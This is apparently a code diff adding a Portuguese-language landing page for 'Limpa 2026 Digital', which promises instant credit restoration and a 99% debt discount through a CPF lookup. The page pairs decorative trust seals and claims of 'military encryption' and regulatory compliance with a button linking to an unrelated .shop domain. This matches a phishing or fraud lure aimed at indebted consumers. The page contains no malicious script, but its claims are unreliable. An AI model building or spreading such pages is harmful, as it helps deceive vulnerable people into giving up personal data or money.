@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Limpa 2026 Digital - Lavender Edition</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Plus+Jakarta+Sans:wght@400;700&display=swap');
+        
+        :root {
+            --lavender-main: #a855f7;
+            --pink-accent: #ec4899;
+            --deep-obsidian: #0f0720;
+            --silver-text: #f3f4f6;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #080312; /* Fundo Obsidian Noturno */
+            color: var(--silver-text);
+            overflow-x: hidden;
+        }
+
+        h1, .font-heading {
+            font-family: 'Outfit', sans-serif;
+        }
+
+        /* Efeito de Vidro Lilás */
+        .glass-card {
+            background: linear-gradient(160deg, rgba(88, 28, 135, 0.2) 0%, rgba(15, 7, 32, 0.8) 100%);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            box-shadow: 0 50px 100px -20px rgba(0, 0, 0, 0.9), inset 0 1px 1px rgba(255, 255, 255, 0.05);
+            border-radius: 3.5rem;
+            transition: all 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+
+        .glass-card:hover {
+            border-color: rgba(236, 72, 153, 0.4);
+            transform: translateY(-5px);
+            box-shadow: 0 60px 120px -30px rgba(0, 0, 0, 1), inset 0 1px 1px rgba(168, 85, 247, 0.1);
+        }
+
+        /* Botão Gradiente Lilás & Rosa */
+        .cta-button {
+            background: linear-gradient(135deg, #a855f7 0%, #d946ef 50%, #ec4899 100%);
+            background-size: 200% auto;
+            color: white;
+            font-weight: 700;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.5s ease;
+            box-shadow: 0 15px 35px -10px rgba(168, 85, 247, 0.5);
+            border-radius: 9999px;
+        }
+
+        .cta-button:hover {
+            background-position: right center;
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 20px 45px -12px rgba(236, 72, 153, 0.6);
+        }
+
+        /* Brilho Animado no Botão */
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+            transform: scale(0);
+            transition: transform 0.8s ease;
+        }
+
+        .cta-button:hover::before {
+            transform: scale(1);
+        }
+
+        /* Nebulosas de Fundo Lilás e Rosa */
+        .nebula {
+            position: fixed;
+            width: 80vw;
+            height: 80vh;
+            filter: blur(140px);
+            z-index: -1;
+            pointer-events: none;
+            animation: nebula-move 20s ease-in-out infinite alternate;
+        }
+
+        @keyframes nebula-move {
+            from { transform: translate(-10%, -10%) rotate(0deg); }
+            to { transform: translate(10%, 10%) rotate(5deg); }
+        }
+
+        .nebula-1 { top: -30%; right: -15%; background: radial-gradient(circle, rgba(168, 85, 247, 0.15) 0%, transparent 70%); }
+        .nebula-2 { bottom: -30%; left: -15%; background: radial-gradient(circle, rgba(236, 72, 153, 0.1) 0%, transparent 70%); }
+
+        /* Animação de Flutuação */
+        .float-anim {
+            animation: float 8s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-15px) rotate(0.5deg); }
+        }
+
+        /* Partículas de Poeira Estelar Lilás */
+        .stars {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-image: radial-gradient(rgba(168, 85, 247, 0.3) 1px, transparent 1px);
+            background-size: 100px 100px;
+            opacity: 0.2;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col antialiased selection:bg-purple-500/30">
+
+    <div class="stars"></div>
+    <div class="nebula nebula-1"></div>
+    <div class="nebula nebula-2"></div>
+
+    <!-- Header Premium -->
+    <header class="p-8 flex justify-between items-center max-w-7xl mx-auto w-full relative z-10">
+        <div class="flex items-center gap-5 group cursor-pointer">
+            <div class="w-14 h-14 bg-purple-500/10 border border-purple-500/30 rounded-2xl flex items-center justify-center shadow-2xl transition-all duration-500 group-hover:border-pink-400/60 group-hover:scale-110">
+                <svg class="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                </svg>
+            </div>
+            <div class="flex flex-col">
+                <span class="font-extrabold text-3xl tracking-tighter text-white leading-none uppercase">Limpa<span class="text-purple-400">2026</span></span>
+                <span class="text-[10px] font-bold uppercase tracking-[0.4em] text-purple-500 mt-1 group-hover:text-pink-300 transition-colors">Intermediações digital avançada</span>
+            </div>
+        </div>
+
+        <div class="hidden md:flex items-center gap-4 px-6 py-2.5 rounded-full border border-purple-500/10 bg-purple-500/5 backdrop-blur-xl transition-all hover:bg-pink-500/10">
+            <div class="relative flex h-2.5 w-2.5">
+                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-pink-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-purple-500 shadow-[0_0_12px_rgba(168,85,247,1)]"></span>
+            </div>
+            <span class="text-[11px] font-black text-purple-300 uppercase tracking-[0.2em]">Criptografia Militar Ativa</span>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main class="flex-grow flex items-center justify-center p-6 pb-20">
+        <div class="max-w-xl w-full float-anim">
+            <div class="glass-card relative">
+                <!-- Luz interna ambiente -->
+                <div class="absolute -top-32 -left-32 w-64 h-64 bg-purple-500/10 blur-[90px] rounded-full pointer-events-none"></div>
+                
+                <div class="p-12 md:p-20 text-center relative z-10">
+                    <div class="inline-block mb-10">
+                        <span class="bg-purple-500/10 border border-purple-500/20 text-purple-300 text-[11px] font-black px-6 py-2.5 rounded-full uppercase tracking-[0.25em] shadow-lg">
+                            🏦 Limpa Seu Nome 2026
+                        </span>
+                    </div>
+
+                    <h1 class="text-5xl md:text-7xl font-extrabold text-white mb-8 leading-[1.1] tracking-tight">
+                        Sistema <br>
+                        <span class="bg-gradient-to-r from-purple-200 via-purple-400 to-pink-500 bg-clip-text text-transparent italic">Digital.</span>
+                    </h1>
+
+                    <p class="text-slate-400 text-base md:text-xl mb-14 font-medium leading-relaxed max-w-sm mx-auto opacity-90">
+                        Acesso painel para restauração instantânea de crédito via <strong>CPF</strong>.
+                    </p>
+
+                    <!-- Ação Principal -->
+                    <div class="space-y-10">
+                        <a href="https://loscessorfeiraobrasil.shop/" 
+                           class="cta-button w-full py-7 flex items-center justify-center gap-5 text-sm md:text-base uppercase font-black tracking-[0.3em] no-underline">
+                            <span>Iniciar Consulta</span>
+                            <svg class="w-6 h-6 transform transition-transform group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M17 8l4 4m0 0l-4 4m4-4H3" />
+                            </svg>
+                        </a>
+
+                        <!-- Selos de Confiança -->
+                        <div class="flex items-center justify-center gap-12 opacity-40 hover:opacity-70 transition-opacity">
+                            <div class="flex flex-col items-center gap-3">
+                                <div class="w-12 h-12 rounded-2xl bg-slate-900 border border-purple-500/20 flex items-center justify-center">
+                                    <svg class="w-6 h-6 text-purple-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.9L10 1.154l7.834 3.746v5.203c0 5.06-3.342 9.499-7.834 10.897L10 21l-.166-.001c-4.492-1.398-7.834-5.837-7.834-10.897V4.9zM15 11a3 3 0 11-6 0 3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                                </div>
+                                <span class="text-[10px] text-slate-400 font-black uppercase tracking-widest">Seguro</span>
+                            </div>
+                            <div class="flex flex-col items-center gap-3">
+                                <div class="w-12 h-12 rounded-2xl bg-slate-900 border border-purple-500/20 flex items-center justify-center">
+                                    <svg class="w-6 h-6 text-purple-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9 2a1 1 0 000 2h2a1 1 0 100-2H9z"></path><path fill-rule="evenodd" d="M4 5a2 2 0 012-2 3 3 0 003 3h2a3 3 0 003-3 2 2 0 012 2v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5zm3 4a1 1 0 000 2h.01a1 1 0 100-2H7zm3 0a1 1 0 000 2h3a1 1 0 100-2h-3zm-3 4a1 1 0 100 2h.01a1 1 0 100-2H7zm3 0a1 1 0 100 2h3a1 1 0 100-2h-3z" clip-rule="evenodd"></path></svg>
+                                </div>
+                                <span class="text-[10px] text-slate-400 font-black uppercase tracking-widest">Protegido</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Métricas Lavender -->
+                    <div class="mt-20 pt-12 border-t border-white/5 flex justify-around">
+                        <div class="text-center group">
+                            <p class="text-[11px] font-black text-purple-400/60 uppercase tracking-widest mb-3 group-hover:text-pink-400 transition-colors">Abatimento</p>
+                            <p class="text-4xl font-black text-white tracking-tighter">99<span class="text-xl text-purple-500">%</span></p>
+                        </div>
+                        <div class="w-[1px] h-16 bg-gradient-to-b from-transparent via-purple-500/20 to-transparent"></div>
+                        <div class="text-center group">
+                            <p class="text-[11px] font-black text-purple-400/60 uppercase tracking-widest mb-3 group-hover:text-pink-400 transition-colors">Acesso</p>
+                            <p class="text-4xl font-black text-white tracking-tighter italic">LIVE</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer de Elite -->
+    <footer class="mt-auto p-14 text-center bg-black/60 backdrop-blur-md border-t border-purple-900/30">
+        <div class="max-w-md mx-auto mb-8 h-[1px] bg-gradient-to-r from-transparent via-purple-500/30 to-transparent"></div>
+        <p class="text-[11px] text-slate-500 font-bold uppercase tracking-[0.5em] mb-5">
+            Limpa 2026 Digital Holding © 2026
+        </p>
+        <p class="text-[10px] text-slate-700 font-medium max-w-md mx-auto leading-loose">
+            Canal tecnológico de liquidação de ativos. Operação segura com protocolos de criptografia ponta-a-ponta e conformidade com as normas digitais vigentes.
+        </p>
+    </footer>
+
+</body>
+</html>
